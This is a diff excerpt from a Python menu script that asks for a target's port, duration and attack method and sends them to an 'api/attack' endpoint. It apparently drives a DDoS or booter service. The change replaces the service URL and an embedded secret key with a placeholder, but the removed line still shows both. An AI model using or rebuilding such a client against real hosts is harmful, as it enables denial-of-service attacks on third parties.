@@ -209,7 +209,7 @@ while True:
         port_ = input("Enter the Port: ")
         time_ = input("Enter the Time: ")
         methods_ = input("Enter the Methods: ")
-        r = requests.post('http://api.rocketapi.cf/api/attack?username=YouTube&secret=ROCKET-YTPROMO691&host={ip_}&port={port_}&time={time_}&method={methods_}')
+        r = requests.post('API LINK')
         website_content = r.content
         
     elif choice == 7:
